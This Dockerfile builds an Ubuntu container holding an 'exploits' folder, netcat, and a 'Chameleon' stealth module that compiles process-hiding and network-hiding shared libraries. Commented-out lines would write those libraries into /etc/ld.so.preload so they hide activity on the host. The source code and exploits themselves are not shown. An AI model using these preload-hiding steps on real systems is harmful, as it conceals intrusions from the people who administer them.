FROM ubuntu as baseImage

RUN apt update && apt install -y netcat net-tools python3-pip

# Chameleon builder (stealth module)
FROM baseImage as builder
COPY ./src /opt/src
RUN mkdir /opt/build

# Chameleon builder
RUN gcc -Wall -fPIC -shared -o /opt/build/libprocesshider.so /opt/src/chameleon/processhider.c -ldl
#RUN mv libprocesshider.so /usr/local/lib
#RUN echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
RUN gcc -Wall -fPIC -shared -o /opt/build/libnetworkhider.so /opt/src/chameleon/networkhider.c -ldl
#RUN mv libnetworkhider.so /usr/local/lib
#RUN echo /usr/local/lib/libnetworkhider.so >> /etc/ld.so.preload


FROM baseImage
COPY ./exploits /opt/exploits
COPY --from=builder /opt/build/ /opt/exploits/

ENTRYPOINT [ "/bin/bash" ]
